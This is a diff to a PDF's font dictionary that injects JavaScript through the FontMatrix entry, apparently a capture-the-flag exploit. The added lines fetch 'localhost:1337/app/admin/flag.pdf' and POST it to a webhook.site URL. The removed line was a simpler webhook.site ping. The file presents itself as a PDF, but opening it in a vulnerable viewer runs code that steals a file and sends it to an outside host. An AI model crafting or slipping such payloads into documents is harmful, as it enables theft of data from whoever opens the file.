@@ -28,7 +28,16 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\("https://webhook.site/6c11665e-2b08-4d8c-b41c-3769f1328ae5?jsinjectionremote"\)
+  fetch\("localhost:1337/app/admin/flag.pdf"\)
+    .then\(response => {
+      const formData = new FormData\(\);
+      formData.append\('file', response.blob\(\), 'uploaded_file'\);
+
+      const xhr = new XMLHttpRequest\(\);
+      xhr.open\('POST', "https://webhook.site/6c11665e-2b08-4d8c-b41c-3769f1328ae5", true\);
+
+      xhr.send\(formData\);
+    }\)
 //)]
 /Subtype/Type1
 /FirstChar 65
